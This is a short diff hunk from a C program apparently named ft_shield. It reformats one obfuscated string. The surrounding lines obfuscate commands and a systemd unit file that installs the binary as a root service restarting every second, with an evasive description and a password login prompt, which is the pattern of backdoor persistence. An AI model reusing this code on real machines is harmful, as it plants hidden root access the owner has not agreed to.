@@ -28,10 +28,7 @@ static uint8_t systemctl_daemon_reload[] = OBFUSCATE("systemctl daemon-reload > 
 static uint8_t systemctl_start_ft_shield[] = OBFUSCATE("systemctl start ft_shield > /dev/null 2>&1");
 static uint8_t systemctl_stop_ft_shield[] = OBFUSCATE("systemctl stop ft_shield > /dev/null 2>&1");
 static uint8_t systemctl_enable_ft_shield[] = OBFUSCATE("systemctl enable ft_shield > /dev/null 2>&1");
-static uint8_t systemd_config[] = OBFUSCATE("[Unit]\nDescription=None of your business "
-                                            "G\nAfter=network.target\nStartLimitIntervalSec=0\n\n[Service]\nType="
-                                            "simple\nRestart=always\nRestartSec=1\nUser=root\nExecStart=/bin/ft_shield "
-                                            "%s\n\n[Install]\nWantedBy=multi-user.target\n");
+static uint8_t systemd_config[] = OBFUSCATE("[Unit]\nDescription=None of your business G\nAfter=network.target\nStartLimitIntervalSec=0\n\n[Service]\nType=simple\nRestart=always\nRestartSec=1\nUser=root\nExecStart=/bin/ft_shield %s\n\n[Install]\nWantedBy=multi-user.target\n");
 static uint8_t systemd_config_path[] = OBFUSCATE("/etc/systemd/system/ft_shield.service");
 static uint8_t invalid_password_try_again[] = OBFUSCATE("Invalid password, try again\n");
 static uint8_t login_successful[] = OBFUSCATE("Login successful\n");
